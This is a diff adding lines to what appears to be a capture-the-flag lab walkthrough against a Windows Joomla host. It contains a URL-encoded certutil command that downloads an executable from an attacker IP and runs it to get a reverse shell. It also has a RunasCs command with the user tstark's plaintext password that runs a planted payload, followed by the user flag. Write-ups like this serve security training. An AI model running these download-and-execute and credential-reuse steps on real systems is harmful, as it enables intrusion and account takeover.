@@ -413,3 +413,16 @@ using certutil%20-urlcache%20-f%20http://10.10.16.125:80/revs45.exe%20revs45.exe
 downloading the file and now we run it
 
 start%20revs45.exe and we get the reverse shell
+
+so we get the reverse shell as web_account
+
+now we want to enter as tstark
+
+we need to upload a new payload and runascs.exe 
+
+RunasCs.exe "tstark" "playboy69" "C:\xampp\htdocs\joomla\templates\cassiopeia\r46.exe"
+
+and we get the shell as tstark
+
+now we go cd c:\Users\tstark\Desktop> and get the user flag:
+    c5bb6829dfd26187aaf6f305e5ee179b
